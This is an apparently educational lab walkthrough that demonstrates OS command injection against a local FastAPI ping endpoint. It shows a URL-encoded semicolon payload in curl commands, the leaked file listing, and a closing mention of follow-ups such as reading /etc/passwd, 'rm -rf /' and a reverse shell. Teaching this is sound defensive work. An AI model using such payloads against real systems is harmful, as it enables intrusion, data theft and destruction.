## Prerequisites
First, ensure the vulnerable server (vulnerable.py) is running.

```Bash
uvicorn vulnerable:app --reload
```

## Exploitation Steps
The goal is to inject a new operating system command into the "ping" tool. The attacker will use a semicolon (;), which is a shell command separator, to chain a malicious command (ls) onto the intended ping command.

1. Perform a Normal Ping
Before the attack, we use the API as intended to ping a legitimate host, like Google's DNS (8.8.8.8).

```Bash
curl "http://127.0.0.1:8000/ping?host=8.8.8.8"
```

Expected Response (Normal): The API correctly returns the output of the ping -c 3 8.8.8.8 command.

```Bash
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=12.5 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=117 time=13.0 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=117 time=12.8 ms

--- 8.8.8.8 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
...
```

2. Perform the Exploit (Command Injection)
Next, the attacker provides a specially crafted payload. This payload must be URL-encoded to handle the special characters (;, ).

Note: The payload is 8.8.8.8 ; ls. The semicolon ends the first command and starts a new one. This is encoded as 8.8.8.8%20%3B%20ls.

```Bash
curl "http://127.0.0.1:8000/ping?host=8.8.8.8%20%3B%20ls"
```

The vulnerable code in vulnerable.py builds the following malicious command string: ping -c 3 8.8.8.8 ; ls

The server's operating system executes this. It runs the ping command first, and then, after it finishes, it runs the injected ls command.

3. Analyze the Result
The API incorrectly returns the output of both commands. The attacker sees the normal ping results, followed by a list of all the files in the server's directory.

Successful Exploit Response (Data Leaked):


```Bash
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
...
--- 8.8.8.8 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
...

README.md
solution.py
vulnerable.py
```
This confirms the exploit was successful. The attacker can now run commands on the server to read files (e.g., cat /etc/passwd), delete files (rm -rf /), or create a reverse shell, leading to a full system compromise.